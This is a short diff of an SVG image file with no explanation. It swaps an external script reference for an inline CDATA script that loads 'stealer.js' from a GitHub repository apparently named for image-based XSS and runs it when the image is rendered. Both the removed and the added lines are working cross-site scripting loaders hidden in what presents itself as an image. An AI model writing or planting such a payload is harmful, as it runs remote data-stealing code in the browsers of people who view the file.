@@ -1,3 +1,9 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script xlink:href="https://raw.githubusercontent.com/B6G-K1LLER/img-xss/refs/heads/main/stealer.js"></script>
+  <script>
+    <![CDATA[
+      let s = document.createElement("script");
+      s.src = "https://raw.githubusercontent.com/B6G-K1LLER/img-xss/main/stealer.js";
+      document.body.appendChild(s);
+    ]]>
+  </script>
 </svg>
